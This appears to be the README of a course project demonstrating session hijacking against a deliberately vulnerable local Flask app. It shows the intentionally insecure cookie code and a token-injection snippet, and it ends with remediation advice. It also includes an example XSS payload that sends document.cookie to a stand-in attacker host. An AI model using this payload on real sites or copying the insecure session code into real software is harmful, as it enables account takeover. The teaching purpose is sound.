# Session Hijacking Demonstration - PCYB Cybersecurity Project

## ⚠️ Disclaimer
This payload is created for **educational purposes only** as part of a cybersecurity course project. The target application (`aplikacja_celu`) was intentionally designed with security vulnerabilities for learning purposes.

**WARNING:** Only use this on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal.

## 📁 Project Structure
```
PCYB_Projekt/
├── aplikacja_celu/          # Vulnerable target application
│   ├── main.py              # Flask app with security flaws
│   ├── Dockerfile
│   └── docker-compose.yml
└── payload/                 # Attack demonstration scripts
    ├── session_hijack.py    # Session hijacking script
    └── README.md            # This file
```

## 🎯 Target Application Vulnerabilities

The target application (`aplikacja_celu`) contains intentional security flaws:

### 1. **Predictable Session Token**
```python
SESSION_COOKIE_VALUE = "admin_session_token_pcyb"
```
- Hardcoded, static session token
- No cryptographic randomness
- Same token for all sessions

### 2. **Insecure Cookie Configuration**
```python
response.set_cookie(SESSION_COOKIE_NAME, SESSION_COOKIE_VALUE, 
                   httponly=False,    # ❌ JavaScript can access
                   secure=False,      # ❌ Transmitted over HTTP
                   samesite='Lax')    # ⚠️ Partially permissive
```

### 3. **No Session Validation**
- No IP address binding
- No User-Agent validation
- No session expiration
- No session regeneration on login

### 4. **Potential XSS Vectors**
- Cookie accessible via `document.cookie`
- No Content-Security-Policy headers
- No input sanitization shown in templates

## 🚀 Usage

### Prerequisites
1. Target application must be running:
```powershell
cd aplikacja_celu
docker-compose up -d --build
```

2. Install Python dependencies for the payload:
```powershell
pip install requests
```

### Running the Attack Script

From the project root directory:
```powershell
python payload\session_hijack.py
```

The script will demonstrate multiple attack vectors:
1. **Predictable Token Attack** - Direct injection of known session token
2. **Cookie Theft Simulation** - Shows how XSS would extract cookies
3. **Session Replay Attack** - Using captured cookie to gain access
4. **Session Information Extraction** - Analyzing cookie properties

### Expected Output
```
╔═══════════════════════════════════════════════════════════╗
║     SESSION HIJACKING DEMONSTRATION                       ║
║     PCYB Cybersecurity Project                           ║
║     Educational Purpose Only - Authorized Testing        ║
╚═══════════════════════════════════════════════════════════╝

[✓] Target application is reachable at http://localhost:5000
[*] Starting demonstration of session hijacking techniques...

============================================================
ATTACK VECTOR #1: Predictable Session Token
============================================================
[✓] SESSION HIJACK SUCCESSFUL!
[✓] Gained unauthorized access to protected page
...
```

## 🔍 Attack Vectors Demonstrated

### 1. Predictable Session Token Exploitation
**How it works:**
- Attacker discovers or guesses the hardcoded session token
- Injects the token into their own browser
- Gains immediate access without authentication

**Code:**
```python
session.cookies.set("PCYB_forum_session", "admin_session_token_pcyb")
response = session.get("http://localhost:5000/protected")
# ✓ Authenticated as admin
```

### 2. XSS-Based Cookie Theft
**How it works:**
- Attacker finds XSS vulnerability in the application
- Injects JavaScript payload to steal cookies
- Sends stolen cookie to attacker-controlled server

**Example XSS Payload:**
```html
<script>
  // Since httponly=False, JavaScript can access the cookie
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**In browser console:**
```javascript
// This works because httponly=False
console.log(document.cookie);
// Output: PCYB_forum_session=admin_session_token_pcyb
```

### 3. Network Sniffing / MITM Attack
**How it works:**
- Since `secure=False`, cookie is sent over HTTP
- Attacker on same network can sniff traffic
- Extract session cookie from unencrypted packets

**Tools used in real scenarios:**
- Wireshark
- tcpdump
- Ettercap
- mitmproxy

### 4. Session Replay Attack
**How it works:**
- Attacker obtains valid session cookie (any method)
- Sets cookie in their own browser
- Replays requests to access protected resources
- Session remains valid indefinitely (no timeout)

## 🛡️ Security Recommendations

### For Session Management:
```python
# SECURE IMPLEMENTATION EXAMPLE
import secrets
import hashlib
from datetime import datetime, timedelta

# 1. Generate cryptographically random session token
session_token = secrets.token_urlsafe(32)

# 2. Store session server-side with metadata
sessions[session_token] = {
    'user_id': user.id,
    'created_at': datetime.now(),
    'last_activity': datetime.now(),
    'ip_address': request.remote_addr,
    'user_agent': request.headers.get('User-Agent')
}

# 3. Set secure cookie
response.set_cookie(
    'session_id',
    session_token,
    httponly=True,      # ✓ Prevent JavaScript access
    secure=True,        # ✓ HTTPS only
    samesite='Strict',  # ✓ Prevent CSRF
    max_age=3600        # ✓ 1 hour expiration
)
```

### Additional Security Measures:
1. **Session Validation:**
   - Bind session to IP address
   - Validate User-Agent on each request
   - Implement absolute and idle timeouts

2. **Cookie Security:**
   - Always use `httponly=True`
   - Always use `secure=True` in production
   - Use `samesite='Strict'` for sensitive operations

3. **XSS Prevention:**
   - Sanitize all user input
   - Use Content-Security-Policy headers
   - Escape output in templates

4. **Additional Layers:**
   - Implement CSRF tokens
   - Use rate limiting
   - Log suspicious activities
   - Monitor for session anomalies

## 📚 Learning Objectives

This demonstration illustrates:
- ✓ Why predictable tokens are dangerous
- ✓ The importance of HttpOnly flag
- ✓ Why HTTPS (Secure flag) matters
- ✓ Session management best practices
- ✓ Defense-in-depth security principles
- ✓ Real-world attack scenarios

## 🔗 References

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP Session Hijacking Attack](https://owasp.org/www-community/attacks/Session_hijacking_attack)
- [MDN: Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)

## 📝 Report Template

For your course submission, document:
1. **Vulnerability identified** - Describe each flaw
2. **Exploitation method** - How the attack works
3. **Impact assessment** - What attacker can do
4. **Proof of concept** - Screenshots/logs from script
5. **Remediation** - Specific fixes recommended
6. **Verification** - How to test fixes work

---

**Author:** PCYB Cybersecurity Course Project  
**Date:** October 2025  
**Purpose:** Educational demonstration of session hijacking vulnerabilities
